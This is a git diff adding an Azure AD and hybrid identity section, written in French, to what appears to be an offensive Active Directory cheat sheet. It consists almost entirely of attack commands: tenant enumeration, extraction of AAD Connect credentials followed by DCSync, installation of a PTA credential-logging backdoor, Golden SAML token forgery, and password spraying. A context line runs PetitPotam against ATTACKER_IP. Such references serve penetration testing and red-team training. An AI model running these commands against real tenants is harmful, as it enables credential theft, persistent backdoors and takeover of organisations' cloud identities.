@@ -335,6 +335,68 @@ python3 PetitPotam.py ATTACKER_IP dc01.domain.local
 
 ---
 
+## Azure AD / Hybrid
+
+### Énumération
+
+```bash
+# Vérifier tenant (non authentifié)
+curl "https://login.microsoftonline.com/TARGET.COM/v2.0/.well-known/openid-configuration"
+
+# AADInternals - Recon externe
+Invoke-AADIntReconAsOutsider -DomainName "target.com"
+
+# ROADtools - Énumération complète
+roadrecon auth -u user@target.com -p 'Password'
+roadrecon gather
+roadrecon gui
+
+# AzureHound - BloodHound pour Azure
+azurehound -u user@target.com -p 'Password' list --tenant target.com -o output.json
+```
+
+### Azure AD Connect
+
+```powershell
+# Extraire credentials AAD Connect (sur le serveur)
+Import-Module AADInternals
+Get-AADIntSyncCredentials
+
+# Le compte MSOL_* a des droits DCSync!
+secretsdump.py 'DOMAIN/MSOL_xxx:Password@dc01'
+```
+
+### PTA Backdoor
+
+```powershell
+# Sur serveur avec agent PTA
+Install-AADIntPTASpy
+Get-AADIntPTASpyLog  # Credentials en clair!
+```
+
+### Golden SAML
+
+```powershell
+# Sur serveur ADFS
+Export-AADIntADFSSigningCertificate
+
+# Forger token SAML
+$saml = New-AADIntSAMLToken -ImmutableID "ID" -PfxFileName "cert.pfx" -Issuer "http://adfs.domain.local/..."
+$at = Get-AADIntAccessTokenWithSAML -SAMLToken $saml -Resource "https://graph.microsoft.com"
+```
+
+### Password Spray Azure
+
+```bash
+# MSOLSpray
+python3 MSOLSpray.py --userlist users.txt --password 'Spring2024!'
+
+# Trevorspray (évite lockouts)
+trevorspray -u users.txt -p passwords.txt
+```
+
+---
+
 ## Defense Evasion
 
 ### AMSI Bypass
